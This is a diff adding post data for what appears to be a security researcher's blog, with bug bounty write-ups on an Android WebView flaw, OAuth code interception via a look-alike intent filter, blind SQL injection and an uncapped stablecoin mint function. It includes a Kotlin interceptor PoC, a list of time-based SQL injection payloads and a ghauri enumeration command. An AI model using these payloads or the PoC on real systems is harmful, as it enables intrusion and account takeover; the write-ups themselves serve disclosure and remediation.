+                    <p>In a realistic attack scenario, a malicious actor could:</p>
+                    <ul class="list-disc pl-6 space-y-4">
+                        <li>Create a seemingly legitimate app and distribute it through third-party app stores or via phishing</li>
+                        <li>Once installed on the user's device, the malicious app could trigger the vulnerability when the user interacts with it</li>
+                        <li>The WebView in the news app would open with the attacker's JavaScript executing</li>
+                        <li>The JavaScript could display fake login forms to steal credentials or display misleading news content</li>
+                    </ul>
+                    <p>The potential for spreading misinformation through a trusted news source makes this vulnerability particularly concerning, despite its technical limitations.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Remediation Strategies</h3>
+                    <p>I recommended several remediation approaches to the development team:</p>
+                    <ol class="list-decimal pl-6 space-y-4">
+                        <li><strong>Remove or Restrict Exported Activities:</strong> The primary fix is to either remove android:exported="true" from the activity definition or implement proper intent filters.</li>
+                        <li><strong>Implement URL Validation:</strong> Add proper URL validation before loading content in the WebView.</li>
+                        <li><strong>Implement Content Security Policy:</strong> For additional protection, implement a CSP within the WebView.</li>
+                        <li><strong>Disable JavaScript When Not Needed:</strong> Consider whether JavaScript is actually needed.</li>
+                    </ol>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Resolution and Reward</h3>
+                    <p>After submitting the vulnerability report, the development team acknowledged the issue and implemented several of my recommended fixes. For discovering and responsibly reporting this vulnerability, I was awarded a bounty of <strong>REDACTED</strong>.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Conclusion</h3>
+                    <p>This case study highlights the importance of properly implementing WebView components in Android applications. Even seemingly minor implementation oversights can lead to vulnerabilities that malicious actors could exploit.</p>
+                    <p>By sharing these findings, I hope to contribute to improving security practices across the mobile app development community and highlight the ongoing importance of security testing for even the most established applications.</p>
+                `
+            },
+            'news-app-oauth': {
+                title: "How a News App Leaked OAuth Codes: A Real-World Interception Story",
+                category: "Android Security",
+                date: "December 30, 2024",
+                severity: "High",
+                reward: "REDACTED",
+                cvss: "8.7",
+                vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N",
+                content: `
+                    <p>Mobile applications are increasingly becoming the primary access point for online services, making their security paramount. Despite the robust security measures built into modern mobile platforms, vulnerabilities can still emerge, especially in the implementation of authentication mechanisms. In this writeup, I'll share my discovery of a critical vulnerability in a news application's Android version that allowed malicious apps to intercept OAuth authorization codes during the login process.</p>
+                    
+                    <div class="bg-primary/5 border-l-4 border-primary p-6 my-8">
+                        <h4 class="text-primary font-bold mb-2 uppercase text-xs tracking-widest">Note on Responsible Disclosure</h4>
+                        <p class="text-sm italic">This vulnerability was responsibly disclosed to the affected organization. All details shared in this post have been approved for publication after the issue was resolved. The target name and specific identifiers have been redacted.</p>
+                    </div>
+                    
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Understanding the Vulnerability Context</h3>
+                    <p>OAuth is a widely-used authorization framework that enables third-party applications to access user accounts without exposing credentials. In mobile applications, this typically involves redirecting users to a web view for authentication and then back to the application upon successful login. If this redirection mechanism is improperly implemented, it can potentially allow attackers to intercept sensitive authentication tokens.</p>
+                    
+                    <p>The vulnerability I discovered in the news application existed due to two critical issues:</p>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li>Exported authentication activities in the Android manifest</li>
+                        <li>Insecure handling of deep links in the OAuth flow</li>
+                    </ul>
+                    <p>These issues combined could allow a malicious application to intercept the OAuth authorization code when a user completes the login process, potentially leading to unauthorized access to the user's account.</p>
+                    
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Technical Analysis</h3>
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Vulnerable Components</h4>
+                    <p>After examining the application's manifest file, I discovered that the RedirectActivity, responsible for handling OAuth callbacks, was exported and accessible to other applications on the device:</p>
+                    
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+&lt;activity
+    android:name="com.auth0.android.provider.RedirectActivity"
+    android:exported="true"&gt;
+    &lt;intent-filter android:autoVerify="true"&gt;
+        &lt;action android:name="android.intent.action.VIEW"/&gt;
+        &lt;category android:name="android.intent.category.DEFAULT"/&gt;
+        &lt;category android:name="android.intent.category.BROWSABLE"/&gt;
+        &lt;data
+            android:scheme="@string/auth0_scheme_french"
+            android:host="@string/auth0_domain_production"
+            android:pathPrefix="/android/com.newsplus.reader/callback"/&gt;
+    &lt;/intent-filter&gt;
+&lt;/activity&gt;</pre>
+
+                    <p>Additionally, I analyzed the RedirectActivity implementation to understand how it processes OAuth callbacks:</p>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+public final class RedirectActivity extends Activity {
+    @Override // android.app.Activity
+    public void onCreate(Bundle savedInstanceBundle) {
+        super.onCreate(savedInstanceBundle);
+        Intent intent = new Intent(this, (Class&lt;?&gt;) AuthenticationActivity.class);
+        intent.addFlags(603979776);
+        if (getIntent() != null) {
+            intent.setData(getIntent().getData());
+        }
+        startActivity(intent);
+        finish();
+    }
+}</pre>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">The Attack Vector</h4>
+                    <p>When a user completes authentication through the OAuth flow, the browser or WebView attempts to redirect to a URL with the following format:</p>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+newsapp://login.auth-domain.com/android/com.newsplus.reader/callback?code=AUTHORIZATION_CODE</pre>
+                    <p>Android's intent resolution system will display an app chooser if multiple applications on the device claim to handle this URL scheme. A malicious application could register to handle the same URL pattern, giving it the opportunity to intercept the authorization code if the user selects it from the chooser dialog.</p>
+                    
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Proof of Concept Exploitation</h3>
+                    <p>To demonstrate this vulnerability, I developed a proof-of-concept application that registers to handle the same deep link pattern as the vulnerable news app.</p>
+                    
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Attacker's Manifest Configuration</h4>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+&lt;activity
+    android:name=".CallbackInterceptorActivity"
+    android:exported="true"&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name="android.intent.action.VIEW" /&gt;
+        &lt;category android:name="android.intent.category.DEFAULT" /&gt;
+        &lt;category android:name="android.intent.category.BROWSABLE" /&gt;
+        &lt;data
+            android:host="login.auth-domain.com"
+            android:scheme="newsapp"
+            android:pathPrefix="/android/com.newsplus.reader/callback" /&gt;
+    &lt;/intent-filter&gt;
+&lt;/activity&gt;</pre>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Malicious Activity Implementation</h4>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+package com.example.app
+
+import android.content.Intent
+import android.net.Uri
+import android.os.Bundle
+import android.util.Log
+import android.widget.TextView
+import androidx.appcompat.app.AppCompatActivity
+
+class CallbackInterceptorActivity : AppCompatActivity() {
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_callback_interceptor)
+
+        val textViewUrl: TextView = findViewById(R.id.textViewUrl)
+
+        // Get the incoming intent
+        val intent: Intent? = intent
+        val data: Uri? = intent?.data
+
+        if (data != null) {
+            // Display the full URL in the TextView
+            val fullUrl = data.toString()
+            textViewUrl.text = "Intercepted URL:\\n$fullUrl"
+            Log.d("CallbackInterceptor", "URL intercepted: $fullUrl")
+        } else {
+            textViewUrl.text = "No URL intercepted."
+            Log.d("CallbackInterceptor", "No URL intercepted.")
+        }
+    }
+}</pre>
+
+                    <div class="bg-white/5 border border-white/10 p-8 my-12 rounded-2xl">
+                        <div class="flex items-center gap-3 mb-6">
+                            <i data-lucide="list-ordered" class="w-5 h-5 text-primary"></i>
+                            <h4 class="text-white font-bold uppercase text-xs tracking-widest">Exploitation Steps</h4>
+                        </div>
+                        <ol class="list-decimal pl-6 space-y-3 text-sm text-slate-400">
+                            <li>Install both the target news application and the malicious PoC application on the same device</li>
+                            <li>Open the news application and initiate the login process</li>
+                            <li>Complete the authentication flow through the WebView</li>
+                            <li>When the WebView redirects to the callback URL, Android displays an app chooser dialog</li>
+                            <li>If the user selects the malicious app from the chooser, it receives the full callback URL containing the authorization code</li>
+                            <li>The attacker can extract the code from the URL and use it to gain access to the user's account</li>
+                        </ol>
+                    </div>
+                    
+                    <div class="my-12 p-4 md:p-8 bg-black/40 rounded-2xl border border-white/5 overflow-x-auto no-scrollbar">
+                        <div class="mermaid min-w-[700px]">
+                            flowchart LR
+                                %% Normal OAuth Flow
+                                subgraph "Normal OAuth Authentication Flow"
+                                A[User initiates login in news app] --> B[News app opens WebView/browser]
+                                B --> C[User logs in on OAuth provider's website]
+                                C --> D[OAuth provider redirects to app's callback URL]
+                                D --> E[RedirectActivity receives authorization code]
+                                E --> F[Forward intent with code to AuthenticationActivity]
+                                F --> G[Exchange authorization code for access token]
+                                G --> H[User logged into news app]
+                                end
+
+                                %% Exploitation Flow
+                                subgraph "Exploitation Scenario"
+                                M[Malicious app installed on device] --> N[Malicious app registers intent filter for callback URL]
+                                N --> O[User initiates login in news app]
+                                O --> P[News app opens WebView/browser]
+                                P --> Q[User logs in on OAuth provider's website]
+                                Q --> R[OAuth provider redirects to callback URL]
+                                R --> S[Android system presents app chooser]
+                                S --> |User selects malicious app| T[Malicious app receives authorization code]
+                                T --> U[Malicious app logs/transmits code to attacker]
+                                U --> V[Attacker can impersonate user]
+                                end
+                        </div>
+                        <p class="text-center text-[10px] font-mono text-slate-500 mt-6 uppercase tracking-widest">Visualization of the OAuth flow and exploitation scenario (Scroll to view)</p>
+                    </div>
+                    
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Impact Analysis</h3>
+                    <p>If successfully exploited, this vulnerability could lead to:</p>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li>Unauthorized access to user accounts in the news application</li>
+                        <li>Complete account takeover, allowing attackers to read personalized news, access saved articles, and potentially view subscription information</li>
+                        <li>Access to user profile data that may be synchronized with the account</li>
+                    </ul>
+                    <p>While this attack has a few mitigating factors that reduce its severity - namely, it requires user interaction to select the malicious app from the chooser dialog and physical access to the device - it still represents a significant security risk, especially for high-profile users who might be targeted specifically.</p>
+                    
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Remediation Strategies</h3>
+                    <p>I recommended several approaches to fix this vulnerability, listed in order of effectiveness:</p>
+                    
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">1. Implement PKCE (Proof Key for Code Exchange)</h4>
+                    <p>The most effective solution is to implement the PKCE extension to the OAuth flow. PKCE adds a code verifier that is created by the client app and verified by the authorization server, making the authorization code useless without the corresponding verifier.</p>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+// Generate a secure random code verifier
+val codeVerifier = PKCEUtil.generateCodeVerifier()
+
+// Generate the code challenge from the verifier
+val codeChallenge = PKCEUtil.generateCodeChallenge(codeVerifier)
+
+// Include the code challenge in the authorization request
+val authRequestUri = Uri.parse("https://auth-domain.com/authorize")
+    .buildUpon()
+    .appendQueryParameter("client_id", "CLIENT_ID")
+    .appendQueryParameter("response_type", "code")
+    .appendQueryParameter("redirect_uri", "newsapp://callback")
+    .appendQueryParameter("code_challenge", codeChallenge)
+    .appendQueryParameter("code_challenge_method", "S256")
+    .build()</pre>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">2. Add Certificate Pinning and App Link Verification</h4>
+                    <p>Using Android App Links with domain verification significantly increases security by ensuring that only the legitimate app can handle the deep links without showing a chooser dialog:</p>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+&lt;intent-filter android:autoVerify="true"&gt;
+    &lt;action android:name="android.intent.action.VIEW" /&gt;
+    &lt;category android:name="android.intent.category.DEFAULT" /&gt;
+    &lt;category android:name="android.intent.category.BROWSABLE" /&gt;
+    &lt;data android:scheme="https" 
+          android:host="login.news-app.com" 
+          android:pathPattern="/callback" /&gt;
+&lt;/intent-filter&gt;</pre>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">3. Implement Runtime Package Validation</h4>
+                    <p>Additionally, the app should validate the calling package at runtime before processing any sensitive callbacks:</p>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+private fun validateCallingPackage(): Boolean {
+    val callingPackage = callingActivity?.packageName ?: return false
+    return callingPackage == "com.legitimate.newsapp" || callingPackage.startsWith("com.android.browser")
+}</pre>
+
+                    <div class="bg-white/5 border border-white/10 p-6 my-8 rounded-xl">
+                        <h4 class="text-white font-bold mb-2 uppercase text-xs tracking-widest">Security Best Practice</h4>
+                        <p class="text-sm text-slate-400">OAuth implementations on mobile platforms should always use PKCE and App Links verification to prevent interception attacks. Following the principle of defense in depth, multiple layers of protection should be implemented rather than relying on a single security mechanism.</p>
+                    </div>
+                    
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Resolution and Reward</h3>
+                    <p>After submitting this vulnerability report through the company's bug bounty program, the development team acknowledged the issue and implemented the recommended fixes in their next application update. The main changes they made were:</p>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li>Implementing PKCE for all OAuth flows</li>
+                        <li>Setting up proper App Links verification</li>
+                        <li>Adding runtime package validation for all redirect handling</li>
+                    </ul>
+                    <p>For this discovery, I was awarded a bounty of <strong>REDACTED</strong>. While the monetary reward was modest, the real value came from knowing that thousands of users now have a more secure authentication experience when using the news application.</p>
+                    
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Conclusion</h3>
+                    <p>This case study highlights the importance of properly implementing OAuth authentication flows in mobile applications. Even well-established apps can have vulnerabilities in their authentication mechanisms that could lead to account compromise.</p>
+                `
+            },
+            'sqli-finding': {
+                title: "SQLi Finding and Exploitation",
+                category: "Web Security",
+                date: "November 26, 2023",
+                severity: "Medium",
+                reward: "$2500",
+                cvss: "6.1",
+                vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+                content: `
+                    <p>In the vast landscape of cyberspace, where lines of code construct virtual realms and digital doors protect valuable information, an intriguing challenge presented itself before me. Little did I know that this seemingly ordinary search page would become the gateway to a thrilling adventure - one that would not only test my technical prowess but also reward my dedication with an unexpected bounty of $2500.</p>
+                    
+                    <p>Just like a detective drawn to a puzzling case, I embarked on a journey that led me to uncover the hidden threat of SQL injection. In this blog post, I invite you to join me in reliving the moments of my discovery, a tale that showcases the power of curiosity, ethical hacking, and the profound impact it can have on the digital world. As the story unfolds, you'll witness how a few lines of malicious code turned into a triumph of cybersecurity, underlining the importance of vigilance in an age where information is both our asset and our vulnerability.</p>
+                    
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">The Journey of Discovery: Unraveling SQL Injection</h3>
+                    
+                    <p>In the vast expanse of the digital landscape, where websites serve as gateways to boundless information, lies a hidden realm of vulnerabilities - a realm I stumbled upon during a seemingly ordinary web exploration. Little did I know that this journey would lead me to unveil a hidden threat known as SQL injection, a discovery that would later earn me a reward of $2500.</p>
+                    
+                    <p>My journey began when I encountered a specific search query parameter, <b>"search=",</b> on a website. With a spark of curiosity, I realized that this parameter could potentially be a gateway to something more intriguing - something that lay beneath the surface. Eager to explore, I started with the basics, attempting common SQL injection payloads, but to no avail.</p>
+                    
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Initial Testing Phase</h4>
+                    
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+if(now()=sysdate(),sleep(5),0)
+'XOR(if(now()=sysdate(),sleep(5),0))XOR'
+'XOR(if(now()=sysdate(),sleep(5*1),0))OR'
+0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z
+0'or(now()=sysdate()&&SLEEP(1))or'Z
+if(now()=sysdate(),sleep(5),0)/"XOR(if(now()=sysdate(),sleep(5),0))OR"/
+if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
+if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0) and 5=5)"/
+if(1=1,sleep(5),0)/*'XOR(if(1=1,sleep(5),0))OR'"XOR(if(1=1,sleep(5),0))OR"*/
+if(1337=1337,exp(~(1)),0)/*'XOR(if(1337=1337,exp(~(1)),0))OR'"XOR(if(1337=1337,sleep(5),0))OR"*/
+SLEEP(5)/*' or SLEEP(5) or '" or SLEEP(5) or "*/
+%2c(select%5*%5from%5(select(sleep(5)))a)
+(select(0)from(select(sleep(5)))v)
+(SELECT SLEEP(5))
+'%2b(select*from(select(sleep(5)))a)%2b'
+(select*from(select(sleep(5)))a)
+1'%2b(select*from(select(sleep(5)))a)%2b'
+,(select * from (select(sleep(5)))a)
+desc%2c(select*from(select(sleep(5)))a)
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))
+-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(5))A))
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)#
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)--
+'+(select*from(select(sleep(5)))a)+'
+(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'"
+(select(0)from(select(sleep(5)))v)%2f*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*%2f
+(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*/
+',''),/*test*/%26%26%09sLeEp(5)%09--+</pre>
+                    
+                    <p>As I encountered roadblocks, my determination only grew stronger. I recalled tales of "blind" SQL injection - a more elusive technique that required patience and precision. Armed with this knowledge, I delved deeper into the art of crafting payloads that could reveal the database's inner workings. Hours turned into days as I experimented, each attempt guiding me closer to understanding the system's vulnerabilities.</p>
+
+                    <p>Then, it happened - an ingenious payload, like a key turning in a lock, granted me access to the system. The thrill of discovery surged through me as I realized I had successfully confirmed the presence of a SQL injection vulnerability. To document this pivotal moment, I captured snapshots of the request and response times, creating a digital record of my triumph.</p>
+                    
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+'and(select*from(select+sleep(10))a/**/union/**/select+1)='</pre>
+                    
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Exploitation and Discovery</h3>
+                    
+                    <p>Wanting to delve even deeper, I sought tools that could aid in exploiting this newfound vulnerability. Initially, I turned to the well-regarded SQL injection testing tool, SQLMap. Armed with the captured request, I set SQLMap on its course. However, for reasons unknown, SQLMap encountered hurdles and was unable to fully exploit the vulnerability.</p>
+
+                    <p>Determined not to be deterred, I explored alternative avenues. Enter "ghauri," a tool designed to wield the power of SQL injection for ethical hackers. Armed with the captured request file, I crafted a command: <code>ghauri -r request.txt -- dbs</code>. With a sense of anticipation, I executed the command, and lo and behold, the names of the databases residing within the system unveiled themselves.</p>
+
+                    <p>Like a modern-day explorer, I embarked on a journey through the databases, navigating uncharted territories within the digital landscape. I methodically enumerated tables and columns, revealing the intricate architecture that held valuable data.</p>
+                    
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+ghauri -r request.txt -- dbs</pre>
+                    
+                    <h4 class="text-lg font-bold text-white mt-8 mb-4">SQL Injection Attack Visualization</h4>
+                    <div class="blog-image-container">
+                        <img 
+                            src="https://miro.medium.com/v2/resize:fit:750/format:webp/0*9wS71DA7rs39znAt.png" 
+                            alt="SQL Injection Attack Visualization" 
+                            class="blog-image"
+                            referrerPolicy="no-referrer"
+                        >
+                        <p class="image-caption">Visual representation of SQL Injection attack flow</p>
+                    </div>
+                    
+                    <p>As my understanding deepened, I recognized the gravity of the impact a successful SQL injection attack could have had - sensitive data exposed, user trust eroded. The importance of responsible disclosure weighed heavily on me.</p>
+
+                    <p>Guided by ethics, I compiled my findings and prepared to share them with the organization responsible for the vulnerable website. It was a pivotal moment - an opportunity to both protect user data and contribute to a safer online ecosystem.</p>
+
+                    <p>The organization's response was not only appreciative but also generous. They recognized the significance of my discovery and rewarded my efforts with a $2500 bounty - a gesture that affirmed the value of ethical hacking and the impact it can have.</p>
+
+                    <p>Through this journey, I learned that in the interconnected world of technology, curiosity and persistence can lead to profound discoveries. My experience underscores the vital role ethical hackers play in safeguarding the digital realm, one vulnerability at a time. Armed with knowledge, tools, and a sense of responsibility, we can collectively fortify our online environments and ensure a safer digital future.</p>
+                    
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Steps to Reproduce</h3>
+                    
+                    <ol class="steps-list">
+                        <li>
+                            <h3>Capturing the Target</h3>
+                            <p>The journey began with a search query - a seemingly innocuous parameter, "search=" on the target website. With the understanding that this parameter could potentially harbor vulnerabilities, I embarked on the first step: capturing the HTTP request.</p>
+                            <p>By intercepting the request using tools like Burp Suite or browser developer tools, I secured a snapshot of the communication between my browser and the website's server. This snapshot was the key that unlocked the door to potential vulnerabilities.</p>
+                        </li>
+                        <li>
+                            <h3>Crafting the Payload</h3>
+                            <p>With the request in hand, I ventured into the world of payloads. Blind SQL injection demands precision - each payload meticulously designed to provoke discernible responses from the server.</p>
+                            <p>Based on my knowledge and experience, I crafted a blind SQL injection payload - a string of characters that, when injected into the parameter, would prompt the server to reveal subtle cues in its responses.</p>
+                        </li>
+                        <li>
+                            <h3>Confirming the Vulnerability</h3>
+                            <p>The heart of the process lay in the responses - the way the server reacted to my payloads. As I injected different variations of the payload, I watched for changes in the site's behavior. These changes were the breadcrumbs guiding me toward confirmation.</p>
+                            <p>Acknowledgment of the payload's impact signaled the presence of a vulnerability. In this case, a successful payload would indicate that the server was processing the SQL injection, setting the stage for deeper exploration.</p>
+                        </li>
+                        <li>
+                            <h3>Documenting the Triumph</h3>
+                            <p>With vulnerability confirmed, I documented the journey. I saved the request, complete with the successful payload, into a file. This record would serve as a reference point - a tangible piece of evidence that encapsulated the moment of discovery.</p>
+                        </li>
+                        <li>
+                            <h3>Leveraging Ghauri</h3>
+                            <p>But the journey didn't stop at vulnerability confirmation; it evolved into exploitation. While tried-and-true tools like SQLMap faltered in this case, the innovative spirit of ethical hacking led me to Ghauri - a tool that promised a fresh approach.</p>
+                            <p>With the captured request file in hand, I invoked Ghauri's power through a command: <code>ghauri -r request.txt -- dbs</code>. The command, like a key turning in a lock, opened the doors to the database realm.</p>
+                        </li>
+                        <li>
+                            <h3>Unveiling the Databases</h3>
+                            <p>The databases unfurled before me, each with its own secrets and stories. This moment was akin to lifting the veil on a trove of information - names that hinted at the breadth of data residing within.</p>
+                            <p>As I navigated the databases, I recognized that this was only the beginning - an entry point to a labyrinth of data, tables, and columns that held the potential to transform understanding into insight.</p>
+                        </li>
+                        <li>
+                            <h3>Reporting and Recognition</h3>
+                            <p>In this journey, discovery wasn't the final destination; responsibility followed closely. Armed with knowledge, I compiled my findings into a comprehensive report. I reached out to the organization behind the website, prepared to share both the vulnerability and the steps to remedy it.</p>
+                            <p>Their response was not only appreciative but also rewarding. A bounty of $2500 served as recognition for my commitment to ethical hacking, the responsible disclosure of vulnerabilities, and the potential impact of my actions.</p>
+                        </li>
+                    </ol>
+                    
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Conclusion</h3>
+                    
+                    <p>As ethical hackers, we're the guardians of the digital realm, charting a path of vigilance and knowledge. From crafting payloads to leveraging tools, our actions shape the online landscape, fortifying it against threats.</p>
+                    
+                    <p>Let this journey remind us that with each discovery, we contribute to a safer digital future - one vulnerability at a time. Together, we ensure that technology remains a force for progress, innovation, and trust.</p>
+                    
+                    <p>As the digital horizon expands, let our commitment to ethical hacking remain unwavering. For in our pursuit lies the promise of a more secure, resilient, and interconnected world.</p>
+                    
+                    <p>Step forward, for the journey continues - where lines of code become opportunities, vulnerabilities become lessons, and the path to a safer digital world is illuminated by our collective dedication.</p>
+                `
+            },
+            'unlimited-mint': {
+                title: "Unlimited Mint: The Chair Function That Could Break a Stablecoin",
+                category: "Web3 Security",
+                date: "March 13, 2025",
+                severity: "High",
+                reward: "REDACTED",
+                cvss: "8.8",
+                vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                content: `
+                    <p>DeFi protocols introduce novel financial primitives, but also unique security challenges. In this writeup, I'll share my discovery of a critical vulnerability in a federated token contract that allowed unlimited minting of the underlying token, potentially leading to protocol insolvency and significant user losses.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Vulnerability Details</h3>
+                    <p>The expansion function in the Anchor Fed contract (Fed.sol) at a major DeFi protocol allowed the chair role to mint an unlimited amount of the underlying token (stablecoin) without an upper bound or a timelock/cooldown mechanism. This unrestricted minting capability posed a significant risk of supply inflation, potential peg destabilization, and economic manipulation if the chair role was compromised or misused.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Affected Code</h3>
+                    <p>The vulnerability resided in the expansion function of the Fed.sol contract. Here's the relevant code snippet:</p>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+function expansion(uint amount) public {
+    require(msg.sender == chair, "ONLY CHAIR");
+    underlying.mint(address(this), amount);
+    require(ctoken.mint(amount) == 0, 'Supplying failed');
+    supply = supply.add(amount);
+    emit Expansion(amount);
+}</pre>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Impact Details</h3>
+                    <p>This vulnerability had severe implications for the Anchor Fed contract:</p>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li><strong>Economic Manipulation:</strong> The chair could inflate the stablecoin supply arbitrarily, potentially breaking its peg and undermining the protocol's stability.</li>
+                        <li><strong>Trust Risk:</strong> If the chair's private key was compromised or the role was abused, an attacker could mint unlimited tokens, draining value from the ecosystem or manipulating external protocols (e.g., Compound via ctoken).</li>
+                        <li><strong>Systemic Risk:</strong> Over-supplying the stablecoin could disrupt lending markets or lead to loss of confidence in the protocol's products.</li>
+                    </ul>
+                    <p>I rated this vulnerability as High severity due to the potential for significant economic damage and the reliance on a single point of failure (chair) without additional safeguards.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Key Issues</h3>
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">1. No Upper Bound on Minting Amount</h4>
+                    <p>The amount parameter was a uint with no maximum limit enforced. The chair could mint any value up to 2^256 - 1, which is practically unlimited. This allowed for arbitrary inflation of the token supply.</p>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">2. No Timelock or Cooldown Period</h4>
+                    <p>The function could be called repeatedly in the same transaction or across multiple transactions without delay. There was no mechanism to prevent rapid, successive minting events.</p>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">3. Sole Reliance on chair Access Control</h4>
+                    <p>Only the chair could call this function, but there were no additional checks (e.g., multi-sig, governance approval, or timelock) to mitigate misuse or compromise of the chair role.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Proof of Concept</h3>
+                    <p>I developed a PoC to demonstrate the vulnerability. The test simulated the chair minting large amounts of tokens repeatedly, confirming the lack of restrictions.</p>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Solidity Code</h4>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.16;
+
+// Mock contracts needed for testing
+contract ERC20Mock {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+    uint256 public totalSupply;
+    
+    function mint(address to, uint256 amount) public {
+        balanceOf[to] += amount;
+        totalSupply += amount;
+    }
+    
+    function burn(uint256 amount) public {
+        balanceOf[msg.sender] -= amount;
+        totalSupply -= amount;
+    }
+    
+    function approve(address spender, uint256 amount) public returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+}
+
+contract CErc20Mock {
+    ERC20Mock public underlyingToken;
+    
+    constructor(address underlying_) public {
+        underlyingToken = ERC20Mock(underlying_);
+    }
+    
+    function mint(uint256 amount) external returns (uint) {
+        return 0;
+    }
+    
+    function underlying() external view returns (address) {
+        return address(underlyingToken);
+    }
+    
+    function redeemUnderlying(uint256 amount) external returns (uint) {
+        return 0;
+    }
+}
+
+contract Fed {
+    using SafeMath for uint;
+    
+    CErc20Mock public ctoken;
+    ERC20Mock public underlying;
+    address public chair;
+    address public gov;
+    uint public supply;
+
+    event Expansion(uint amount);
+    event Contraction(uint amount);
+
+    constructor(CErc20Mock ctoken_, address gov_) public {
+        ctoken = ctoken_;
+        underlying = ERC20Mock(ctoken_.underlying());
+        underlying.approve(address(ctoken), uint(-1));
+        chair = msg.sender;
+        gov = gov_;
+    }
+
+    function expansion(uint amount) public {
+        require(msg.sender == chair, "ONLY CHAIR");
+        underlying.mint(address(this), amount);
+        require(ctoken.mint(amount) == 0, 'Supplying failed');
+        supply = supply.add(amount);
+        emit Expansion(amount);
+    }
+}
+
+// POC Contract
+contract FedExploitTest {
+    Fed public fed;
+    CErc20Mock public ctoken;
+    ERC20Mock public underlying;
+    
+    event LogBalance(uint256 balance);
